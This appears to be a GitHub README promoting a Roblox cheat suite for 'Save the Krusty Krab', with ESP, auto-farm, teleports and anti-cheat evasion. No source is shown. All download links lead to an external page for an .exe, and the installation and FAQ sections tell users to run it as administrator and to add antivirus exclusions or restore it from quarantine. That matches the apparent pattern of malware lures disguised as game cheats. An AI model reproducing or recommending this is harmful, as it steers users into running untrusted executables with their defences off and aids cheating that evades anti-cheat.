<div align="center">
<img src="assets/banner.png" width="100%" alt="Save Krusty Krab Script banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-ff6a6a?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-DC2626?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-DB2777?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=2563EB&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%94%A7+Krusty+Krab+Script;%E2%9C%85+Built+for+Windows+11;%F0%9F%9A%80+Standalone+.exe+Release;%E2%9C%A8+Ready+for+Windows;%F0%9F%92%A1+Community+Tested;%E2%AD%90+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=vscode" />
  <img src="https://skillicons.dev/icons?i=rust" />
</p>

---

<div align="center">

![status](https://img.shields.io/badge/status-active-brightgreen?style=plastic)
![platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-blue?style=plastic)
![license](https://img.shields.io/badge/license-MIT-lightgrey?style=plastic)
![build](https://img.shields.io/badge/build-2026%20rebuild-orange?style=plastic)

**Save the Krusty Krab Script** — a fan-made Roblox script suite for the *Save the Krusty Krab* experience. Auto-farm, ESP, teleports, money loops, and a full menu of Krusty Krab survival tools, rebuilt from scratch for the 2026 season.

</div>

---

## 📜 Table of Contents

- [Compatibility](#-compatibility)
- [What is Save the Krusty Krab Script — Term Glossary](#-what-is-save-the-krusty-krab-script--term-glossary)
- [Quick Start](#-quick-start)
- [All Modules Status](#-all-modules-status)
- [The Solution](#-the-solution)
- [Tips for Best Results](#-tips-for-best-results)
- [Installation](#-installation)
- [Roadmap / Planned Features](#-roadmap--planned-features)
- [How It Works](#-how-it-works)
- [Comparison](#-comparison)
- [Changelog — v2026 Build](#-changelog--v2026-build)
- [Known Issues](#-known-issues)
- [FAQ](#-faq)
- [v2026 Build Download](#-v2026-build-download)

---

## 🖥️ Compatibility

The Krusty Krab script targets the Roblox client only. It is not a standalone game — it injects into the Roblox process and hooks the *Save the Krusty Krab* experience. The 2026 rebuild was focused entirely on tightening that hook layer and reducing the injection footprint.

| Platform | Support | Notes |
|---|---|---|
| Windows 11 (23H2+) | ✅ Full | Primary dev target — all modules tested |
| Windows 10 (21H2+) | ✅ Full | Verified, only Admin prompt differs |
| Windows 8.1 | ⚠️ Partial | Legacy build works, some UI scale issues |
| macOS | ❌ None | No injector path — do not file issues |
| Linux (Wine) | ⚠️ Experimental | Users report mixed results, unsupported |
| Android / iOS | ❌ None | Roblox mobile has no executor path |
| Roblox Store (UWP) | ❌ None | Desktop Store build is sandboxed |
| Standard Roblox Client | ✅ Full | The only officially tested target |

> Executor requirement: the .exe must be paired with a compatible Roblox executor (a script injector). The suite itself ships the script payload and menu — it does not bundle an injector. Admin rights are required to attach to the Roblox process.

---

## 🧾 What is Save the Krusty Krab Script — Term Glossary

New to the Krusty Krab scene? Here's the vocabulary the community actually uses.

| Term | Explanation |
|---|---|
| **Script** | A Lua payload loaded into Roblox via an executor — this project ships the Save the Krusty Krab script itself. |
| **Executor / Injector** | The third-party program that attaches to Roblox and runs Lua. You supply your own. |
| **ESP** | ESP draws boxes, names, and tracers over players or NPCs so you can see them through walls. |
| **Auto-farm** | A loop that plays the game for you — collects money, defends the Krusty Krab, repeats. |
| **Hotkey** | A keyboard bind that toggles a module on/off without opening the menu (e.g. RightShift for the GUI). |
| **Teleport / Tween** | Moves your character instantly (teleport) or smoothly (tween) to a coordinate or named location. |
| **Auto-parry / Auto-block** | Auto-triggers a defensive action on incoming attacks — the Krusty Krab equivalent of a dodge script. |
| **Money loop** | A repeating sequence that maximizes cash-per-minute by cycling the best paying order/defense routines. |
| **Kick / Ban risk** | The chance Roblox anti-cheat or the game's own detection kicks you. This script minimizes but never eliminates it. |

**Why the community uses it:**

- Grinding the Krusty Krab defense waves manually takes hours — auto-farm compresses it to minutes.
- Some events (limited-time orders, boss waves) reward fast reaction — hotkey toggles help.
- ESP makes finding hidden order items and NPC spawns practical.
- Money loops let you actually afford the late-game upgrades before the season resets.
- The whole thing is open-source, so you can read the Lua before you run it.

---

## 🍔 Quick Start

Getting the script in-game takes about two minutes if your executor is already set up.

1. 🖱️ **Visit the project page** — grab the latest build from the landing page (link at the bottom of this README).
2. 📦 **Download and extract** the archive to a folder you control — extract, don't run from the .zip.
3. 🛡️ **Run as Admin** — right-click the .exe → *Run as administrator* so it can attach to the Roblox process.
4. 🎮 **Launch Roblox** and join the *Save the Krusty Krab* experience. Wait until you're fully loaded in.
5. ⌨️ **Press RightShift** to open the menu, load the script payload, and toggle the modules you want.
<p align="center">
  <a href="https://BasaltSnailStable.github.io/krusty-krab-script/">
    <img src="https://img.shields.io/badge/INSTALL-Save_the_Krusty-EA580C?style=for-the-badge&logo=github&logoColor=white&labelColor=C2410C" width="580" alt="INSTALL Save the Krusty"/>
  </a>
</p>
---

## 🧩 All Modules Status

The 2026 rebuild ships 31 modules. Honest status below — ✅ means working and tested this build, ⚠️ means works but has caveats, 🧪 means experimental, ❌ means disabled for now.

| Module | Status | Description |
|---|---|---|
| Auto-Farm Loop | ✅ Working | Cycles orders and defense tasks automatically at configurable speed. |
| Money Multiplier Loop | ✅ Working | Optimizes cash-per-minute by picking highest-value order chains. |
| Player ESP | ✅ Working | Boxes, names, distances over every player in the Krusty Krab. |
| NPC ESP | ✅ Working | Highlights customers, bosses, and hidden NPC spawns through walls. |
| Order Item ESP | ✅ Working | Tracers to active order items and pickups. |
| Tracer Lines | ✅ Working | Draws lines from screen edge to tracked entities. |
| Teleport to Player | ✅ Working | Instantly move to any player in the server. |
| Teleport to Krusty Krab | ✅ Working | Snap back to the restaurant interior from anywhere on the map. |
| Teleport to Boss Spawn | ✅ Working | Jump to the current boss spawn point. |
| Waypoint Save / Load | ✅ Working | Save custom coordinates and jump back to them. |
| Auto-Parry | ✅ Working | Auto-triggers defensive blocks on incoming attacks. |
| Auto-Heal | ✅ Working | Consumes healing items when HP drops below a configurable threshold. |
| Auto-Collect | ✅ Working | Picks up order items and drop-loot in range. |
| Auto-Cook | ✅ Working | Automates the grill/cook mini-game sequence. |
| Auto-Serve | ✅ Working | Delivers completed orders to the right tables automatically. |
| Auto-Clean | ✅ Working | Clears messes and dirty tables on a loop. |
| Speed Walk | ⚠️ Working | Walkspeed modifier — high values can trigger anti-cheat. |
| Jump Boost | ⚠️ Working | Adjustable jump power, capped for safety. |
| Fly (Tween) | 🧪 Experimental | Smooth tween flight — visually cleaner but occasionally desyncs. |
| Noclip | 🧪 Experimental | Walk through walls — disabled inside the restaurant interior. |
| Infinite Stamina | ✅ Working | Removes stamina drain on sprint and actions. |
| Instant Interact | ✅ Working | Removes the interaction hold-timer on objects. |
| Anti-AFK | ✅ Working | Keeps you from being kicked for idle during long farms. |
| Anti-Kick (soft) | ⚠️ Working | Attempts to catch and ignore common kick events — not bulletproof. |
| Server Hop | ✅ Working | Rejoins a fresh server when the current one is dead. |
| Auto-Rejoin | ✅ Working | Rejoins the same server after a disconnect. |
| FPS Unlocker | ✅ Working | Raises the Roblox frame cap for smoother ESP. |
| Low-Graphics Mode | ✅ Working | Drops render quality for max farm throughput. |
| GUI Theme Switcher | ✅ Working | Dark / light / Krusty themes for the menu. |
| Config Save / Load | ✅ Working | Persists module states and settings between sessions. |
| Panic Key | ✅ Working | One hotkey disables every module and hides the GUI instantly. |

---

## 🎯 The Solution

The Krusty Krab grind has specific pain points. Here's what this project does about each.

| Problem | Solution |
|---|---|
| Manual farming eats hours per session | Auto-farm loop cycles orders and defense with configurable speed. |
| Can't find hidden order items | Order Item ESP + tracers render them through walls. |
| Boss waves wipe you before you react | Auto-parry + auto-heal with threshold sliders. |
| Late-game upgrades cost more than a season's grind | Money loop picks the highest-value order chains automatically. |
| Server dies and you lose progress | Auto-rejoin + server hop keep you in a live lobby. |
| Menu-driven scripts are slow to toggle mid-fight | RightShift hotkey + panic key for instant on/off. |
| Random scripts break every game update | This is a maintained open-source repo with issue tracking. |

---

## 💡 Tips for best results

- Always run the .exe **as administrator** — attaching to Roblox without elevation fails silently.
- Join the game **before** loading the script payload — injecting on the loading screen can wedge the executor.
- Keep **speed walk and jump boost** modest. Anything above the community-tested range is the #1 cause of kicks.
- Use **panic key** (default: End) when a mod/admin joins — it disables every module in one press.
- Save a **config profile** per activity (farm profile vs. event profile) and swap with one click.
- Run **FPS unlocker** if ESP feels laggy — tracers are render-bound.
- If a module shows ⚠️ in the status table, treat it as best-effort. Report issues, don't expect miracles.

---

## 🛠️ Installation

Numbered sub-steps, in order. Do not skip step 1.

1. **Download the archive.**
   - Use the <p align="center">
  <a href="https://BasaltSnailStable.github.io/krusty-krab-script/">
    <img src="https://img.shields.io/badge/GET_STARTED-Save_the_Krusty-2563EB?style=plastic&logo=windows&logoColor=white&labelColor=1D4ED8" width="580" alt="GET STARTED Save the Krusty"/>
  </a>
</p> link at the bottom of this page.
   - Save to a folder you own (e.g. `Desktop\KrustyScript`), not Program Files.

2. **Extract, don't run zipped.**
   - Right-click the archive → *Extract All*.
   - Windows Defender may flag the extracted .exe — this is expected for any script injector-adjacent tool. If your AV quarantines it, restore from quarantine or add an exclusion. Review the source if you're unsure.

3. **Run as Admin and launch.**
   - Right-click the .exe → *Run as administrator*.
   - Launch Roblox and join *Save the Krusty Krab*.
   - Press **RightShift** in-game to open the menu and load the payload.

---

## 🗺️ Roadmap / Planned Features

| Feature | Status | ETA |
|---|---|---|
| Auto-parry v2 (predictive) | 🧪 In progress | Q2 2026 |
| Item magnet (radius) | 📋 Planned | Q2 2026 |
| Order queue prioritization | 📋 Planned | Q3 2026 |
| Boss pattern ESP overlay | 📋 Planned | Q3 2026 |
| Mobile-style tap controls (for touchscreen laptops) | 💭 Considering | Q3 2026 |
| Multi-account farm profiles | 💭 Considering | Q4 2026 |
| Config cloud sync | 💭 Considering | Q4 2026 |
| Lua module sandbox (user plugins) | 💭 Considering | 2027 |

---

## ⚙️ How It Works

The 2026 build separates the payload into three layers: an **attach layer** that hooks the Roblox process and establishes a communication channel with your executor, a **script core** that loads the Save the Krusty Krab Lua payload and manages module registration, and a **menu layer** that renders the in-game GUI and forwards your hotkey presses to the core. On launch, the .exe waits for a Roblox window to appear, verifies the experience matches *Save the Krusty Krab*, then hands the payload to your executor. Each module registers itself with the core and can be toggled independently; the panic key unregisters all of them at once. The rebuild replaced the old monolithic script with this layered design specifically to make updates faster and to reduce the surface area that anti-cheat watches. It is not magic — it is a well-organized Lua payload wrapped in a careful attach routine, and it can still be detected.

---

## ⚔️ Comparison

| Aspect | Typical free script | Paid executor bundle | This Toolkit |
|---|---|---|---|
| Source visibility | Closed, often obfuscated | Closed | Open — read the Lua before running |
| Update cadence | Dies after a game patch | Tied to executor vendor | Maintained repo with issue tracker |
| Executor requirement | Bring your own | Bundled | Bring your own (compatible) |
| Module count | 5–10 ad-hoc | 15–25 bundled | 31 documented modules |
| Config persistence | Rare | Sometimes | Built-in save/load profiles |
| Panic key | Rare | Sometimes | Built-in, one-press disable |
| Cost | Free (often sketchy) | Paid subscription | Free, MIT-licensed |
| Support | Discord roulette | Vendor ticket | GitHub issues |

---

## 📝 Changelog — v2026 Build

- **Rebuilt from scratch** — old monolithic script replaced with layered attach/core/menu design.
- **Improved detection resistance** — attach layer rewritten to reduce injection footprint; module toggles no longer spam remote calls.
- **31 modules** — up from 18 in the previous build, with a proper status table.
- **Config save/load** — profiles persist between sessions.
- **Panic key** — one hotkey disables every module.
- **GUI theme switcher** — dark, light, and Krusty themes.
- **Honest status rows** — ⚠️ and 🧪 modules are labeled, not hidden.

---

## 🐛 Known Issues

| Issue | Solution |
|---|---|
| Windows Defender flags the .exe | Add folder exclusion, or restore from quarantine and verify the source. |
| Menu doesn't open with RightShift | Some keyboards remap RightShift — rebind in config. |
| ESP tracers lag on low-end GPUs | Toggle FPS unlocker, or reduce tracer count in settings. |
| Fly module desyncs occasionally | Disable tween smoothing in settings; it's 🧪 for a reason. |
| Script fails to attach on first run | Run as Admin, and join the game fully before loading. |
| Anti-kick catches some kicks only | No soft anti-kick is perfect — report specific kick messages in issues. |

---

## ❓ FAQ

| Question | Answer |
|---|---|
| Is this free? | Yes — MIT-licensed and open-source. No paywalls, no subscription. |
| Do I need to buy an executor? | You need a *compatible* Roblox executor. Free and paid ones exist; the repo does not ship one. |
| Will I get banned? | Any script carries kick/ban risk. This build reduces the footprint but does not eliminate detection. Use an alt account if you're worried. |
| Does it work on the mobile version? | No. Roblox mobile has no executor path. This is Windows-only. |
| Why does my antivirus flag it? | Script injectors are commonly flagged by heuristic AV. Add an exclusion and read the source if you're cautious. |
| How often is it updated? | After each major *Save the Krusty Krab* game patch. Check the changelog and issues. |
| Can I modify the Lua? | Yes — it's open-source. Fork it, edit it, submit a PR if it's useful. |
| Where do I report bugs? | GitHub Issues — include your Windows version, executor name, and the exact module. |
| Is there a Discord? | Not officially. The repo's issues tab is the support channel. |
| Does it support multiple accounts? | Not yet — multi-account profiles are on the roadmap for Q4 2026. |

---

## 📦 v2026 Build Download

The current build is the **2026 rebuild** — layered attach/core/menu design, 31 modules, config profiles, and the panic key. Download, extract, run as Admin, join the game, press RightShift.
<div align="center">
  <a href="https://BasaltSnailStable.github.io/krusty-krab-script/">
    <img src="https://img.shields.io/badge/GET-Save_the_Krusty_2026-9333EA?style=plastic&logo=download&logoColor=white&labelColor=7E22CE" width="500" alt="GET Save the Krusty 2026"/>
  </a>
</div>
---

*Save the Krusty Krab Script is a fan-made, open-source hobbyist project. It is not affiliated with Roblox Corporation or the developers of Save the Krusty Krab. Use at your own risk — scripting can result in account action, and the maintainers accept no responsibility for bans, lost progress, or anything else. Read the Lua, test on an alt, and report issues honestly. The 2026 rebuild exists because the community asked for a version that actually documents its own limitations.*
